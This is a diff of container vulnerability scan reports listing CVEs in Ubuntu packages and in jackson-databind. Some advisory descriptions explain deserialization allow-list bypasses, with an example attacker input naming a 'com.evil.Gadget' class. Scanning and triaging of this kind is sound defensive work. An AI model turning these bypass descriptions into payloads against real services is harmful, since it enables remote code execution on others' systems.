 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3918,7 +3997,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35364 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:39.737Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:27.97Z 
-│                        ├ [71] ╭ VulnerabilityID : CVE-2026-35367 
+│                        ├ [73] ╭ VulnerabilityID : CVE-2026-35367 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -3962,7 +4041,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35367 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:40.423Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:28.297Z 
-│                        ├ [72] ╭ VulnerabilityID : CVE-2026-35368 
+│                        ├ [74] ╭ VulnerabilityID : CVE-2026-35368 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4006,7 +4085,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35368 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:40.56Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:28.4Z 
-│                        ├ [73] ╭ VulnerabilityID : CVE-2026-35370 
+│                        ├ [75] ╭ VulnerabilityID : CVE-2026-35370 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4051,7 +4130,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-35370 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:40.833Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:28.613Z 
-│                        ├ [74] ╭ VulnerabilityID : CVE-2026-35371 
+│                        ├ [76] ╭ VulnerabilityID : CVE-2026-35371 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4096,7 +4175,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-35371 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:40.987Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:28.723Z 
-│                        ├ [75] ╭ VulnerabilityID : CVE-2026-35373 
+│                        ├ [77] ╭ VulnerabilityID : CVE-2026-35373 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4148,7 +4227,7 @@
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-35373 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:41.997Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:28.933Z 
-│                        ├ [76] ╭ VulnerabilityID : CVE-2026-35374 
+│                        ├ [78] ╭ VulnerabilityID : CVE-2026-35374 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4196,7 +4275,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35374 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:42.127Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:29.04Z 
-│                        ├ [77] ╭ VulnerabilityID : CVE-2026-35377 
+│                        ├ [79] ╭ VulnerabilityID : CVE-2026-35377 
 │                        │      ├ PkgID           : rust-coreutils@0.8.0-0ubuntu3 
 │                        │      ├ PkgName         : rust-coreutils 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/rust-coreutils@0.8.0-0ubuntu3?arch=am
@@ -4244,7 +4323,7 @@
 │                        │      │                  ╰ [3]: https://www.cve.org/CVERecord?id=CVE-2026-35377 
 │                        │      ├ PublishedDate   : 2026-04-22T17:16:42.577Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:40:29.357Z 
-│                        ├ [78] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [80] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : systemd@259.5-0ubuntu3 
 │                        │      ├ PkgName         : systemd 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/systemd@259.5-0ubuntu3?arch=amd64&dis
@@ -4288,7 +4367,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [79] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [81] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : systemd-cryptsetup@259.5-0ubuntu3 
 │                        │      ├ PkgName         : systemd-cryptsetup 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/systemd-cryptsetup@259.5-0ubuntu3?arc
@@ -4332,7 +4411,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [80] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [82] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : systemd-resolved@259.5-0ubuntu3 
 │                        │      ├ PkgName         : systemd-resolved 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/systemd-resolved@259.5-0ubuntu3?arch=
@@ -4376,7 +4455,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [81] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [83] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : systemd-sysv@259.5-0ubuntu3 
 │                        │      ├ PkgName         : systemd-sysv 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/systemd-sysv@259.5-0ubuntu3?arch=amd6
@@ -4420,7 +4499,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [82] ╭ VulnerabilityID : CVE-2026-40228 
+│                        ├ [84] ╭ VulnerabilityID : CVE-2026-40228 
 │                        │      ├ PkgID           : systemd-timesyncd@259.5-0ubuntu3 
 │                        │      ├ PkgName         : systemd-timesyncd 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/systemd-timesyncd@259.5-0ubuntu3?arch
@@ -4464,7 +4543,7 @@
 │                        │      │                         8/1 
 │                        │      ├ PublishedDate   : 2026-04-10T16:16:33.753Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:44:53.31Z 
-│                        ├ [83] ╭ VulnerabilityID : CVE-2024-56433 
+│                        ├ [85] ╭ VulnerabilityID : CVE-2024-56433 
 │                        │      ├ PkgID           : uidmap@1:4.17.4-2ubuntu3 
 │                        │      ├ PkgName         : uidmap 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/uidmap@4.17.4-2ubuntu3?arch=amd64&dis
@@ -4527,7 +4606,7 @@
 │                        │      │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2024-56433 
 │                        │      ├ PublishedDate   : 2024-12-26T09:15:07.267Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T08:12:10.903Z 
-│                        ├ [84] ╭ VulnerabilityID : CVE-2026-27456 
+│                        ├ [86] ╭ VulnerabilityID : CVE-2026-27456 
 │                        │      ├ PkgID           : util-linux@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : util-linux 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/util-linux@2.41.3-3ubuntu2?arch=amd64
@@ -4601,7 +4680,7 @@
 │                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-27456 
 │                        │      ├ PublishedDate   : 2026-04-03T22:16:25.4Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T10:27:11.017Z 
-│                        ├ [85] ╭ VulnerabilityID : CVE-2026-3184 
+│                        ├ [87] ╭ VulnerabilityID : CVE-2026-3184 
 │                        │      ├ PkgID           : util-linux@2.41.3-3ubuntu2 
 │                        │      ├ PkgName         : util-linux 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/util-linux@2.41.3-3ubuntu2?arch=amd64
@@ -4650,8 +4729,8 @@
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-3184 
 │                        │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-3184 
 │                        │      ├ PublishedDate   : 2026-04-03T19:17:23.377Z 
-│                        │      ╰ LastModifiedDate: 2026-06-17T10:43:10.203Z 
-│                        ├ [86] ╭ VulnerabilityID : CVE-2021-31879 
+│                        │      ╰ LastModifiedDate: 2026-07-21T19:10:00.107Z 
+│                        ├ [88] ╭ VulnerabilityID : CVE-2021-31879 
 │                        │      ├ PkgID           : wget@1.25.0-2ubuntu4.2 
 │                        │      ├ PkgName         : wget 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/wget@1.25.0-2ubuntu4.2?arch=amd64&dis
@@ -4704,14 +4783,15 @@
 │                        │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2021-31879 
 │                        │      ├ PublishedDate   : 2021-04-29T05:15:08.707Z 
 │                        │      ╰ LastModifiedDate: 2026-06-17T03:52:23.987Z 
-│                        ├ [87] ╭ VulnerabilityID : CVE-2026-15146 
+│                        ├ [89] ╭ VulnerabilityID : CVE-2026-15146 
 │                        │      ├ PkgID           : wget@1.25.0-2ubuntu4.2 
 │                        │      ├ PkgName         : wget 
 │                        │      ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/wget@1.25.0-2ubuntu4.2?arch=amd64&dis
 │                        │      │                  │       tro=ubuntu-26.04 
 │                        │      │                  ╰ UID : d2f332e16b5c263c 
 │                        │      ├ InstalledVersion: 1.25.0-2ubuntu4.2 
-│                        │      ├ Status          : affected 
+│                        │      ├ FixedVersion    : 1.25.0-2ubuntu4.3 
+│                        │      ├ Status          : fixed 
 │                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
 │                        │      │                  │         197d9e39c5494d4581e40 
 │                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
@@ -4744,11 +4824,12 @@
 │                        │      │                  │      t/?id=4f85853f641863d5915786a8413e1a213726a62b 
 │                        │      │                  ├ [2]: https://kb.cert.org/vuls/id/564823 
 │                        │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-15146 
-│                        │      │                  ├ [4]: https://www.cve.org/CVERecord?id=CVE-2026-15146 
-│                        │      │                  ╰ [5]: https://www.kb.cert.org/vuls/id/564823 
+│                        │      │                  ├ [4]: https://ubuntu.com/security/notices/USN-8572-1 
+│                        │      │                  ├ [5]: https://www.cve.org/CVERecord?id=CVE-2026-15146 
+│                        │      │                  ╰ [6]: https://www.kb.cert.org/vuls/id/564823 
 │                        │      ├ PublishedDate   : 2026-07-10T19:17:20.307Z 
 │                        │      ╰ LastModifiedDate: 2026-07-15T19:16:57.323Z 
-│                        ╰ [88] ╭ VulnerabilityID : CVE-2026-27171 
+│                        ╰ [90] ╭ VulnerabilityID : CVE-2026-27171 
 │                               ├ PkgID           : zlib1g@1:1.3.dfsg+really1.3.1-1ubuntu3 
 │                               ├ PkgName         : zlib1g 
 │                               ├ PkgIdentifier    ╭ PURL: pkg:deb/ubuntu/zlib1g@1.3.dfsg%2Breally1.3.1-1ubuntu
@@ -4812,456 +4893,1155 @@
 │      ├ Class          : lang-pkgs 
 │      ├ Type           : jar 
 │      ├ Packages        
-│      ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-54512 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-j3rv-43j4-c7qm 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 2.18.8, 3.1.4, 2.21.4 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54512 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:786f35b1ad3c80021fdf174f0566a863d2679765e43ae581d4266
-│                        │     │                   2686de4f61a 
-│                        │     ├ Title           : jackson-databind: jackson-databind: Arbitrary code execution
-│                        │     │                    via PolymorphicTypeValidator bypass 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
-│                        │     │                   jackson-databind's PolymorphicTypeValidator (PTV) is the
-│                        │     │                   primary safety mechanism guarding polymorphic
-│                        │     │                   deserialization. When polymorphic typing is enabled and a
-│                        │     │                   type identifier contains generic parameters (i.e. the type
-│                        │     │                   ID string contains <),
-│                        │     │                   DatabindContext._resolveAndValidateGeneric() validates only
-│                        │     │                   the raw container class name (the substring before <)
-│                        │     │                   against the configured PTV. If the container type is
-│                        │     │                   approved, the method parses the full canonical type string
-│                        │     │                   via TypeFactory.constructFromCanonical() and returns the
-│                        │     │                   fully parameterized type without ever validating the nested
-│                        │     │                   type arguments against the PTV. The nested type arguments
-│                        │     │                   are then resolved, instantiated, and populated as beans
-│                        │     │                   during deserialization. An attacker who controls the type ID
-│                        │     │                    can therefore place a denied class as a generic type
-│                        │     │                   parameter of an allowed container — for example
-│                        │     │                   java.util.ArrayList<com.evil.Gadget> when only
-│                        │     │                   java.util.ArrayList is allow-listed. The container passes
-│                        │     │                   the PTV check; com.evil.Gadget is loaded via
-│                        │     │                   Class.forName(name, true, loader), instantiated, and its
-│                        │     │                   properties are set from attacker-controlled JSON. This
-│                        │     │                   completely bypasses an explicitly configured PTV allow-list.
-│                        │     │                    This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.[
-│                        │     │                   m 
-│                        │     ├ Severity        : HIGH 
-│                        │     ├ CweIDs           ╭ [0]: CWE-184 
-│                        │     │                  ╰ [1]: CWE-502 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 3 
-│                        │     │                  ╰ redhat: 3 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-│                        │     │                  │        │           /A:H 
-│                        │     │                  │        ╰ V3Score : 8.1 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-│                        │     │                           │           /A:H 
-│                        │     │                           ╰ V3Score : 8.1 
-│                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54512 
-│                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/4
-│                        │     │                  │      34d6c511de7fdd9872f29157aafb6162d12d8d5 
-│                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
-│                        │     │                  │      988 
-│                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
-│                        │     │                  │      /advisories/GHSA-j3rv-43j4-c7qm 
-│                        │     │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
-│                        │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
-│                        │     ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
-│                        ├ [1] ╭ VulnerabilityID : CVE-2026-54513 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-rmj7-2vxq-3g9f 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54513 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:bbe59b608f43f9a43ff6e91bd3e53f3f9da77840ca65712bc373d
-│                        │     │                   cb013a0971a 
-│                        │     ├ Title           : jackson-databind: Jackson-databind: Security bypass allows
-│                        │     │                   arbitrary code execution 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
-│                        │     │                   BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray(
-│                        │     │                   ) allowlists any array type based only on clazz.isArray(),
-│                        │     │                   without validating the array's component (element) type
-│                        │     │                   against the configured allowlist. A PTV built with
-│                        │     │                   allowIfSubTypeIsArray() plus an explicit concrete-type
-│                        │     │                   allowlist therefore still permits EvilType[] even though
-│                        │     │                   EvilType is not allowlisted. When Jackson deserializes the
-│                        │     │                   elements and no per-element type IDs are present, it
-│                        │     │                   instantiates the component type directly with no further PTV
-│                        │     │                    check, bypassing the allowlist. This vulnerability is fixed
-│                        │     │                    in 2.18.8, 2.21.4, and 3.1.4. 
-│                        │     ├ Severity        : HIGH 
-│                        │     ├ CweIDs           ─ [0]: CWE-184 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 3 
-│                        │     │                  ╰ redhat: 3 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-│                        │     │                  │        │           /A:H 
-│                        │     │                  │        ╰ V3Score : 8.1 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
-│                        │     │                           │           /A:H 
-│                        │     │                           ╰ V3Score : 8.1 
-│                        │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
-│                        │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
-│                        │     │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2026-54513 
-│                        │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
-│                        │     │                  ├ [4] : https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [5] : https://github.com/FasterXML/jackson-databind/commit/
-│                        │     │                  │       01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
-│                        │     │                  ├ [6] : https://github.com/FasterXML/jackson-databind/commit/
-│                        │     │                  │       24529da29fdf46ff94ca38de9ebf31cd188f5e8e 
-│                        │     │                  ├ [7] : https://github.com/FasterXML/jackson-databind/issues/
-│                        │     │                  │       5981 
-│                        │     │                  ├ [8] : https://github.com/FasterXML/jackson-databind/issues/
-│                        │     │                  │       5983 
-│                        │     │                  ├ [9] : https://github.com/FasterXML/jackson-databind/pull/5984 
-│                        │     │                  ├ [10]: https://github.com/FasterXML/jackson-databind/securit
-│                        │     │                  │       y/advisories/GHSA-rmj7-2vxq-3g9f 
-│                        │     │                  ├ [11]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
-│                        │     │                  ├ [12]: https://security.access.redhat.com/data/csaf/v2/vex/2
-│                        │     │                  │       026/cve-2026-54513.json 
-│                        │     │                  ╰ [13]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
-│                        │     ╰ LastModifiedDate: 2026-07-17T13:18:57.98Z 
-│                        ├ [2] ╭ VulnerabilityID : CVE-2026-54514 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54514 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:a3c870613184bd506dc63e25cb2dbde9142832e48cee8472a531e
-│                        │     │                   085622fdc98 
-│                        │     ├ Title           : jackson-databind: jackson-databind: Information Disclosure
-│                        │     │                   via Eager DNS Resolution 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.0.0 until 2.18.8, 2.21.4, and 3.1.4,
-│                        │     │                   JDKFromStringDeserializer constructed InetSocketAddress with
-│                        │     │                    new InetSocketAddress(host, port), which performs eager DNS
-│                        │     │                    name resolution for hostname inputs at deserialization
-│                        │     │                   time. An application that binds untrusted JSON into a type
-│                        │     │                   containing an InetSocketAddress field issues an
-│                        │     │                   attacker-chosen DNS query during readValue, before any
-│                        │     │                   application-level validation or connect logic. The fix uses
-│                        │     │                   InetSocketAddress.createUnresolved(host, port), deferring
-│                        │     │                   DNS to an explicit connect. This vulnerability is fixed in
-│                        │     │                   2.18.8, 2.21.4, and 3.1.4. 
-│                        │     ├ Severity        : MEDIUM 
-│                        │     ├ CweIDs           ─ [0]: CWE-918 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-│                        │     │                  ╰ redhat: 2 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-│                        │     │                  │        │           /A:N 
-│                        │     │                  │        ╰ V3Score : 5.3 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
-│                        │     │                           │           /A:N 
-│                        │     │                           ╰ V3Score : 5.3 
-│                        │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54514 
-│                        │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
-│                        │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/1
-│                        │     │                  │      f5a1037b1e9e05920e755cb35f198bcd46667e4 
-│                        │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/5951 
-│                        │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
-│                        │     │                  │      /advisories/GHSA-hgj6-7826-r7m5 
-│                        │     │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-54514 
-│                        │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-54514 
-│                        │     ├ PublishedDate   : 2026-06-23T21:17:02.467Z 
-│                        │     ╰ LastModifiedDate: 2026-06-27T20:55:09.61Z 
-│                        ├ [3] ╭ VulnerabilityID : CVE-2026-54515 
-│                        │     ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
-│                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-│                        │     ├ PkgPath         : opt/oaf/openaf.jar 
-│                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
-│                        │     │                  │       @2.21.1 
-│                        │     │                  ╰ UID : 3293a4ace0bf5e 
-│                        │     ├ InstalledVersion: 2.21.1 
-│                        │     ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
-│                        │     ├ Status          : fixed 
-│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
-│                        │     │                  │         97d9e39c5494d4581e40 
-│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
-│                        │     │                            f117adb7086d939b6bf5 
-│                        │     ├ SeveritySource  : ghsa 
-│                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
-│                        │     ├ DataSource       ╭ ID  : ghsa 
-│                        │     │                  ├ Name: GitHub Security Advisory Maven 
-│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
-│                        │     │                          cosystem%3Amaven 
-│                        │     ├ Fingerprint     : sha256:def36c8a6356da27a572e98b6c44a3834a905197354fd7d2cb993
-│                        │     │                   afa5df77bf3 
-│                        │     ├ Title           : jackson-databind: jackson-databind: Ignored properties can
-│                        │     │                   be unexpectedly modified 
-│                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-│                        │     │                   functionality and tree-model for Jackson Data Processor.
-│                        │     │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
-│                        │     │                   BeanDeserializerBase.createContextual(), per-property
-│                        │     │                   @JsonIgnoreProperties exclusions are applied by
-│                        │     │                   _handleByNameInclusion(), producing a contextual
-│                        │     │                   deserializer whose BeanPropertyMap has the ignored
-│                        │     │                   properties removed. The subsequent per-property
-│                        │     │                   case-insensitivity block (triggered by
-│                        │     │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
-│                        │     │                   from this._beanProperties (the original, unfiltered map)
-│                        │     │                   instead of contextual._beanProperties, then overwrites the
-│                        │     │                   filtered map — restoring every property
-│                        │     │                   _handleByNameInclusion had just removed. The ignored
-│                        │     │                   property becomes writable again. This vulnerability is fixed
-│                        │     │                    in 2.18.9, 2.21.5, and 3.1.4. 
-│                        │     ├ Severity        : MEDIUM 
-│                        │     ├ CweIDs           ─ [0]: CWE-915 
-│                        │     ├ VendorSeverity   ╭ ghsa  : 2 
-│                        │     │                  ╰ redhat: 2 
-│                        │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
-│                        │     │                  │        │           /A:N 
-│                        │     │                  │        ╰ V3Score : 5.3 
-│                        │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
